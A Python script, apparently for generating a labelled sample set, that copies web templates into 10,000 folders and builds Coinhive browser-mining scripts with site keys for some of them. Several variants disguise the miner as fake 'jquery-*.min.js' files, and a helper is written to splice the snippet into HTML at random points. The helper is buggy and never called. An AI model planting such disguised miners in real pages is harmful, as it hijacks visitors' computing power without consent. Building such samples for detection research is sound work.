#!/usr/bin/python
from json import loads
from os import listdir, mkdir
from distutils.dir_util import copy_tree
from shutil import rmtree, copyfile
from re import split
from random import random

randomInt = lambda x: int(random() * x)

def inject_code(file, content):
  if content[0] == '<' and content[-1] == '>':
    content = content[1:][:-1]

  with open(x, 'rb') as f:
    a = f.read()

  b = split('>\s+<', a)
  b.insert(randomInt(len(b)), content)

  c = '><'.join(b)

  with open(x, 'wb') as f:
    f.write(c)

# read seed
a = None
with open('seed.txt', 'r') as f:
  a = f.read()
a = loads(a)

# read template list
template = listdir('sample/template/')
rmtree('sample/output/', ignore_errors=True)
mkdir('sample/output/')

keyword = ['windmill', 'rok', 'smartphone', 'listenrine', 'electronic', 'coffee', 'hyunki', 'saykim', 'suedragon']

for i in range(10000):
  j ,k = a[i] / 0x10, a[i] % 0x10
  src = 'sample/template/%s/' % (template[j])
  dst = 'sample/output/%04d/' % (i)
  copy_tree(src, dst)

  if k == 0:
    pass
  elif k == 1: # COINHIVE JehKQTdWK2WwDl8lOG8Pmx7F3w8K7Z0H
    x = '<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous("JehKQTdWK2WwDl8lOG8Pmx7F3w8K7Z0H", {throttle: 0.3}); if (!miner.isMobile() && !miner.didOptOut(14400)) { miner.start(); }</script>'
    pass
  elif k == 2: # COINHIVE w4npHvGBkqousLtpNIel6Hekoy1DWc2i
    copyfile('sample/coinhive.min.js', dst + 'coinhive.min.js')
    x = '<script src="coinhive.min.js"></script><script>new CoinHive.Anonymous("w4npHvGBkqousLtpNIel6Hekoy1DWc2i").start();</script>'
    pass
  elif k == 3: # COINHIVE 4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm
    k = keyword[randomInt(len(keyword))]
    copyfile('sample/coinhive.min.js', dst + ('jquery-%s.min.js' % k))
    x = '<script src="jquery-%s.min.js"></script><script>(()=>new CoinHive.Anonymous("4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm").start())()</script>' % k
    pass
  elif k == 4: # COINHIVE 4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm
    copyfile('sample/coinhive.min.js', dst + 'jquery-windmill.min.js')
    x = '<script src="jquery-windmill.min.js"></script><script>(()=>new CoinHive.Anonymous("4yyxYWKic2XBzE5xBw1UXzyoqLzOrtpm").start())()</script>'
    pass
  elif k == 5: # JSECOIN
    pass
  elif k == 6: # MYSITE
    pass
